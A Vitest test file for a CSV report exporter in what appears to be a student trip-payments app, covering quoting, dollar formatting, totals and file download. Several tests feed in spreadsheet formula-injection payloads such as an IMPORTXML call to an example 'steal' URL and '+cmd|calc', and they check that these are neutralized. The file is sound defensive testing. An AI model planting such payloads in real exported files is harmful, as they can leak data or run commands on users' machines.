// @vitest-environment jsdom
import { afterEach, describe, expect, it, vi } from 'vitest';
import type { Report } from '../../shared/types';
import {
  CSV_BOM,
  cellToCsv,
  centsToCsvDollars,
  columnTotals,
  csvField,
  csvLine,
  displayColumns,
  downloadCsv,
  extraTotals,
  formatStamp,
  neutralizeFormula,
  reportFileName,
  reportToCsv,
  toCsv,
} from './csv';

function makeReport(overrides: Partial<Report> = {}): Report {
  return {
    kind: 'payments',
    title: 'Payments',
    description: 'Every Payments row in the date range.',
    generatedAt: '2026-10-21T12:00:00.000Z',
    filters: { from: '2026-07-01', to: '2027-06-30' },
    columns: [
      { key: 'date', label: 'Date', type: 'date' },
      { key: 'student', label: 'Student', type: 'text' },
      { key: 'amount', label: 'Amount', type: 'money' },
      { key: 'payerEmail', label: 'Payer email', type: 'email' },
      { key: 'status', label: 'Status', type: 'text' },
    ],
    rows: [
      { date: '2026-09-02', student: 'Avery Thompson', amount: 25000, payerEmail: 'parent@example.com', status: 'Completed' },
      { date: '2026-10-01', student: 'Liam "LT" Thompson', amount: 123450, payerEmail: null, status: 'Pending' },
    ],
    totals: { amount: 25000 },
    notes: ['Totals count Completed payments only.'],
    containsContactInfo: true,
    ...overrides,
  };
}

describe('centsToCsvDollars', () => {
  it('writes plain dollars with two decimals and no "$" or commas', () => {
    expect(centsToCsvDollars(123450)).toBe('1234.50');
    expect(centsToCsvDollars(100000000)).toBe('1000000.00');
    expect(centsToCsvDollars(0)).toBe('0.00');
    expect(centsToCsvDollars(5)).toBe('0.05');
    expect(centsToCsvDollars(-500)).toBe('-5.00');
    expect(centsToCsvDollars(-1)).toBe('-0.01');
    expect(centsToCsvDollars(12.6)).toBe('0.13');
  });
});

describe('csvField', () => {
  it('leaves plain text alone', () => {
    expect(csvField('Florida 2027')).toBe('Florida 2027');
    expect(csvField('')).toBe('');
  });

  it('quotes commas, quotes and line breaks, doubling quotes (RFC 4180)', () => {
    expect(csvField('Thompson, Avery')).toBe('"Thompson, Avery"');
    expect(csvField('Liam "LT" Thompson')).toBe('"Liam ""LT"" Thompson"');
    expect(csvField('line one\nline two')).toBe('"line one\nline two"');
    expect(csvField('line one\r\nline two')).toBe('"line one\r\nline two"');
    expect(csvField('"')).toBe('""""');
  });
});

describe('neutralizeFormula', () => {
  it.each(['=SUM(A1:A9)', '+1+2', '-2+3', '@cmd', '\tTabbed', '\rReturn'])('puts an apostrophe before %j', (text) => {
    expect(neutralizeFormula(text)).toBe(`'${text}`);
  });

  it('leaves other text alone', () => {
    expect(neutralizeFormula('a=b')).toBe('a=b');
    expect(neutralizeFormula(' =1')).toBe(' =1');
    expect(neutralizeFormula("'quoted")).toBe("'quoted");
    expect(neutralizeFormula('')).toBe('');
  });
});

describe('csvLine and toCsv', () => {
  it('neutralizes text before quoting it', () => {
    expect(csvLine(['=HYPERLINK("http://example.com","x")', 'ok'])).toBe(`"'=HYPERLINK(""http://example.com"",""x"")",ok`);
    expect(csvLine(['-5 late fee, waived'])).toBe(`"'-5 late fee, waived"`);
  });

  it("writes the app's own numbers as numbers, even negative ones", () => {
    expect(csvLine([{ number: '-5.00' }, '-5.00'])).toBe("-5.00,'-5.00");
  });

  it('starts with a UTF-8 byte-order mark and ends every line with CRLF', () => {
    const csv = toCsv([['a', 'b'], ['Zoë', 'naïve']]);
    expect(csv.charCodeAt(0)).toBe(0xfeff);
    expect(csv).toBe(`${CSV_BOM}a,b\r\nZoë,naïve\r\n`);
  });
});

describe('cellToCsv', () => {
  it('formats money, numbers, dates and blanks', () => {
    expect(cellToCsv(123450, 'money')).toEqual({ number: '1234.50' });
    expect(cellToCsv(-2500, 'money')).toEqual({ number: '-25.00' });
    expect(cellToCsv(1024, 'number')).toEqual({ number: '1024' });
    expect(cellToCsv('2026-10-21', 'date')).toBe('2026-10-21');
    expect(cellToCsv('2026-10-21T14:00:00.000Z', 'date')).toBe('2026-10-21');
    expect(cellToCsv(null, 'text')).toBe('');
    expect(cellToCsv(undefined, 'money')).toBe('');
    expect(cellToCsv(Number.NaN, 'money')).toBe('');
    expect(cellToCsv('+1 603-555-0101', 'phone')).toBe('+1 603-555-0101');
  });
});

describe('totals', () => {
  it('splits column totals from totals that have no column', () => {
    const report = makeReport({
      kind: 'fund-activity',
      totals: { amount: 100, credits: 7500, debits: -2500, net: 5000 },
    });
    expect(columnTotals(report)).toEqual({ amount: 100 });
    expect(extraTotals(report).map((t) => [t.label, t.column?.key, t.value])).toEqual([
      ['Credits', 'amount', 7500],
      ['Debits', 'amount', -2500],
      ['Net', 'amount', 5000],
    ]);
    expect(extraTotals(makeReport({ totals: undefined }))).toEqual([]);
  });
});

describe('displayColumns', () => {
  it('moves the student column to the front and keeps the rest in order', () => {
    const keys = (r: Report) => displayColumns(r.columns).map((c) => c.key);
    expect(keys(makeReport())).toEqual(['student', 'date', 'amount', 'payerEmail', 'status']);
    const noStudent = makeReport({ columns: [{ key: 'metric', label: 'What', type: 'text' }, { key: 'value', label: 'Count', type: 'number' }] });
    expect(keys(noStudent)).toEqual(['metric', 'value']);
  });
});

describe('reportToCsv', () => {
  it('lays the report out like the sheet tab: header, rows, totals, then what it is; the student first, as on screen', () => {
    const report = makeReport();
    const csv = reportToCsv(report, { filters: 'Jul 1, 2026 to Jun 30, 2027 · All activities' });
    const lines = csv.slice(1).split('\r\n');
    expect(csv.startsWith(CSV_BOM)).toBe(true);
    expect(csv.endsWith('\r\n')).toBe(true);
    expect(lines).toEqual([
      'Student,Date,Amount,Payer email,Status',
      'Avery Thompson,2026-09-02,250.00,parent@example.com,Completed',
      '"Liam ""LT"" Thompson",2026-10-01,1234.50,,Pending',
      'Total,,250.00,,',
      ',,,,',
      'Payments,,,,',
      'Every Payments row in the date range.,,,,',
      `"Generated ${formatStamp(report.generatedAt)}",,,,`, // "Oct 21, 2026, …" has commas
      '"Filters: Jul 1, 2026 to Jun 30, 2027 · All activities",,,,',
      'Totals count Completed payments only.,,,,',
      '', // after the last CRLF
    ]);
  });

  it('neutralizes formulas typed in the sheet but keeps negative amounts as numbers', () => {
    const report = makeReport({
      columns: [
        { key: 'description', label: 'Description', type: 'text' },
        { key: 'amount', label: 'Amount', type: 'money' },
        { key: 'enteredBy', label: 'Entered by', type: 'text' },
      ],
      rows: [
        { description: '=IMPORTXML("https://example.com/steal")', amount: -2500, enteredBy: '@treasurer' },
        { description: '+cmd|calc', amount: 1000, enteredBy: '-' },
        { description: 'Line one\nline two', amount: 0, enteredBy: '\ttab' },
      ],
      totals: undefined,
      notes: ['=1+1'],
    });
    const lines = reportToCsv(report).slice(1).split('\r\n');
    expect(lines.slice(0, 4)).toEqual([
      'Description,Amount,Entered by',
      `"'=IMPORTXML(""https://example.com/steal"")",-25.00,'@treasurer`,
      "'+cmd|calc,10.00,'-",
      `"Line one\nline two",0.00,'\ttab`,
    ]);
    expect(lines).toContain("'=1+1,,");
  });

  it('puts totals without a column of their own under the first money column', () => {
    const report = makeReport({
      kind: 'fund-activity',
      title: 'Fund activity',
      columns: [
        { key: 'date', label: 'Date', type: 'date' },
        { key: 'student', label: 'Student', type: 'text' },
        { key: 'amount', label: 'Amount', type: 'money' },
      ],
      rows: [
        { date: '2026-09-02', student: 'Avery Thompson', amount: 5000 },
        { date: '2026-09-03', student: 'Avery Thompson', amount: -2000 },
      ],
      totals: { credits: 5000, debits: -2000, net: 3000 },
      notes: undefined,
    });
    const lines = reportToCsv(report).slice(1).split('\r\n');
    expect(lines.slice(0, 6)).toEqual([
      'Student,Date,Amount',
      'Avery Thompson,2026-09-02,50.00',
      'Avery Thompson,2026-09-03,-20.00',
      'Credits,,50.00',
      'Debits,,-20.00',
      'Net,,30.00',
    ]);
  });

  it('has a header and the description even with no rows', () => {
    const lines = reportToCsv(makeReport({ rows: [], totals: { amount: 0 } })).slice(1).split('\r\n');
    expect(lines[0]).toBe('Student,Date,Amount,Payer email,Status');
    expect(lines[1]).toBe('Total,,0.00,,');
  });
});

describe('reportFileName', () => {
  it('names the file after the report and the day it was made', () => {
    expect(reportFileName('trip-balances', '2026-10-21T12:00:00.000Z')).toBe('tma-trip-balances-2026-10-21.csv');
    expect(reportFileName('app-usage', 'not a date')).toMatch(/^tma-app-usage-\d{4}-\d{2}-\d{2}\.csv$/);
  });
});

describe('formatStamp', () => {
  it('always shows the year, so a printout reads right later', () => {
    expect(formatStamp('2026-10-21T12:00:00.000Z')).toMatch(/^Oct 21, 2026, \d{1,2}:\d{2}\s[AP]M$/);
    expect(formatStamp('nope')).toBe('nope');
  });
});

describe('downloadCsv', () => {
  afterEach(() => {
    vi.useRealTimers();
  });

  it('saves a UTF-8 file with a byte-order mark through a temporary link', async () => {
    vi.useFakeTimers();
    let saved: Blob | null = null;
    const createObjectURL = vi.fn((blob: Blob) => {
      saved = blob;
      return 'blob:tma-test';
    });
    const revokeObjectURL = vi.fn();
    Object.assign(URL, { createObjectURL, revokeObjectURL });
    const clicked: Array<{ href: string; download: string; inPage: boolean }> = [];
    vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(function (this: HTMLAnchorElement) {
      clicked.push({ href: this.href, download: this.download, inPage: document.body.contains(this) });
    });

    downloadCsv('tma-payments-2026-10-21.csv', toCsv([['Student', 'Amount'], ['Zoë', { number: '12.50' }]]));

    expect(clicked).toEqual([{ href: 'blob:tma-test', download: 'tma-payments-2026-10-21.csv', inPage: true }]);
    expect(document.querySelector('a[download]')).toBeNull();
    expect(saved).not.toBeNull();
    const blob = saved as unknown as Blob;
    expect(blob.type).toBe('text/csv;charset=utf-8');
    const bytes = new Uint8Array(await blob.arrayBuffer());
    expect(Array.from(bytes.slice(0, 3))).toEqual([0xef, 0xbb, 0xbf]);
    expect(new TextDecoder().decode(bytes.slice(3))).toBe('Student,Amount\r\nZoë,12.50\r\n');

    expect(revokeObjectURL).not.toHaveBeenCalled();
    vi.advanceTimersByTime(10_000);
    expect(revokeObjectURL).toHaveBeenCalledWith('blob:tma-test');
  });
});
